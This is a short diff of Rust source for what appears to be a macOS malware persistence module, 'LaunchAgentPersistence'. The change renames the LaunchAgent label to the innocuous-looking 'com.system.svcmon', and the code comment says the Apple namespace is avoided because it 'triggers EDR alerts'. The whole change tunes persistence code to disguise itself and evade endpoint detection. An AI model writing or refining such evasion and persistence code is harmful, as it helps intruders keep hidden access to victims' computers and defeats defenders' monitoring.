@@ -3,8 +3,8 @@ use std::path::Path;
 use std::process::Command;
 
 pub struct LaunchAgentPersistence;
-// Use com.oxide.* — never com.apple.* (Apple's namespace triggers EDR alerts)
-const LABEL: &str = "com.oxide.update";
+// Use com.system.* — never com.apple.* (Apple's namespace triggers EDR alerts)
+const LABEL: &str = "com.system.svcmon";
 
 fn plist_path() -> anyhow::Result<std::path::PathBuf> {
     let home = std::env::var("HOME").map_err(|_| anyhow::anyhow!("HOME not set"))?;
